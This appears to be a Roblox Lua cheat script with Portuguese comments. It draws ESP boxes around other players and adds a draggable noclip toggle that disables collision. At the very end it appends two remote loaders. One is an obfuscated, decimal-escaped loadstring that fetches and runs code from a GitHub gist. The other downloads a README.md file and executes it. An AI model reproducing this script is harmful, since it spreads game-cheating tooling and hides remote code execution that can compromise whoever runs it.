-- Configurações do ESP
local ESPColor = Color3.new(1, 1, 1) -- Branco
local LineThickness = 2 -- Espessura das bordas
local ESPEnabled = true -- Ativar/Desativar ESP
local BaseBoxWidth = 100 -- Largura base da box
local BaseBoxHeight = 150 -- Altura base da box
local DistanceFactor = 0.1 -- Fator que ajusta o tamanho com base na distância

-- Tabela para armazenar ESPs dos jogadores
local ESPs = {}

-- Função para remover o ESP de um jogador
local function removeESP(player)
    if ESPs[player] then
        for _, line in pairs(ESPs[player]) do
            line.Visible = false
            line:Remove()
        end
        ESPs[player] = nil -- Remove da tabela
    end
end

-- Função para criar as bordas ao redor de um jogador
local function createESP(player)
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local humanoidPart = player.Character.HumanoidRootPart

        -- Criar linhas para formar as bordas da box
        local topLine = Drawing.new("Line")
        local bottomLine = Drawing.new("Line")
        local leftLine = Drawing.new("Line")
        local rightLine = Drawing.new("Line")

        local lines = {topLine, bottomLine, leftLine, rightLine}
        ESPs[player] = lines -- Armazena as linhas na tabela

        -- Configurações das linhas
        for _, line in pairs(lines) do
            line.Color = ESPColor
            line.Thickness = LineThickness
            line.Transparency = 1
            line.Visible = false
        end

        -- Atualizar as bordas durante o jogo
        local connection
        connection = game:GetService("RunService").RenderStepped:Connect(function()
            if ESPEnabled and humanoidPart and humanoidPart.Parent then
                local screenPosition, onScreen = workspace.CurrentCamera:WorldToViewportPoint(humanoidPart.Position)

                if onScreen then
                    local distance = (workspace.CurrentCamera.CFrame.Position - humanoidPart.Position).magnitude
                    local boxWidth = BaseBoxWidth / (distance * DistanceFactor)
                    local boxHeight = BaseBoxHeight / (distance * DistanceFactor)

                    local topLeft = Vector2.new(screenPosition.X - boxWidth / 2, screenPosition.Y - boxHeight / 2)
                    local topRight = Vector2.new(screenPosition.X + boxWidth / 2, screenPosition.Y - boxHeight / 2)
                    local bottomLeft = Vector2.new(screenPosition.X - boxWidth / 2, screenPosition.Y + boxHeight / 2)
                    local bottomRight = Vector2.new(screenPosition.X + boxWidth / 2, screenPosition.Y + boxHeight / 2)

                    topLine.From = topLeft
                    topLine.To = topRight
                    bottomLine.From = bottomLeft
                    bottomLine.To = bottomRight
                    leftLine.From = topLeft
                    leftLine.To = bottomLeft
                    rightLine.From = topRight
                    rightLine.To = bottomRight

                    for _, line in pairs(lines) do
                        line.Visible = true
                    end
                else
                    for _, line in pairs(lines) do
                        line.Visible = false
                    end
                end
            else
                removeESP(player)
                connection:Disconnect() -- Para de atualizar o ESP
            end
        end)

        -- Detectar quando o jogador morre
        if player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid.Died:Connect(function()
                removeESP(player)
                connection:Disconnect()
            end)
        end
    end
end

-- Aplicar ESP para todos os jogadores no jogo
for _, player in pairs(game.Players:GetPlayers()) do
    if player ~= game.Players.LocalPlayer then
        createESP(player)

        -- Detectar quando o jogador renasce
        player.CharacterAdded:Connect(function()
            wait(0.5) -- Pequeno delay para garantir que o HumanoidRootPart carregue
            createESP(player)
        end)
    end
end

-- Detectar novos jogadores entrando no jogo
game.Players.PlayerAdded:Connect(function(player)
    if player ~= game.Players.LocalPlayer then
        player.CharacterAdded:Connect(function()
            wait(0.5)
            createESP(player)
        end)
    end
end)

-- Detectar quando um jogador sai do jogo
game.Players.PlayerRemoving:Connect(function(player)
    removeESP(player) -- Remove a ESP completamente
end)

local player = game.Players.LocalPlayer
local runService = game:GetService("RunService")
local noclip = false
local screenGui

-- Função para criar a interface e estilizar o botão
local function createUI()
    if screenGui then screenGui:Destroy() end

    screenGui = Instance.new("ScreenGui")
    screenGui.Parent = player:WaitForChild("PlayerGui")

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 120, 0, 50)
    button.Position = UDim2.new(1, -140, 0.5, -25) -- Posição inicial no lado direito
    button.Text = "Noclip: OFF"
    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Font = Enum.Font.GothamBold
    button.TextSize = 18
    button.BorderSizePixel = 2
    button.BorderColor3 = Color3.fromRGB(255, 255, 255)
    button.Parent = screenGui

    -- Criando efeito de hover (muda de cor ao passar o mouse)
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    end)
    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    end)

    -- Permitir arrastar o botão no celular
    local dragging, offset, startPos

    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            startPos = input.Position
            offset = Vector2.new(input.Position.X - button.AbsolutePosition.X, input.Position.Y - button.AbsolutePosition.Y)
        end
    end)

    button.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.Touch then
            local newX = input.Position.X - offset.X
            local newY = input.Position.Y - offset.Y
            button.Position = UDim2.new(0, newX, 0, newY)
        end
    end)

    button.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    -- Função para ativar/desativar noclip
    button.MouseButton1Click:Connect(function()
        noclip = not noclip
        button.Text = noclip and "Noclip: ON" or "Noclip: OFF"
        button.BorderColor3 = noclip and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 255, 255)

        if noclip then
            -- Loop para manter noclip ativo
            runService.Stepped:Connect(function()
                if noclip and player.Character then
                    for _, part in pairs(player.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end)
        else
            -- Restaurar colisão quando desativado
            if player.Character then
                for _, part in pairs(player.Character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                    end
                end
            end
        end
    end)
end

-- Criar UI inicial
createUI()

-- Garantir que o script continue após a morte
player.CharacterAdded:Connect(function()
    task.wait(1) -- Espera o personagem carregar
    createUI() -- Recria a UI após respawn
end)

loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()

loadstring(game:HttpGet("https://raw.githubusercontent.com/soutexdograu/TP-ca/refs/heads/main/README.md"))()
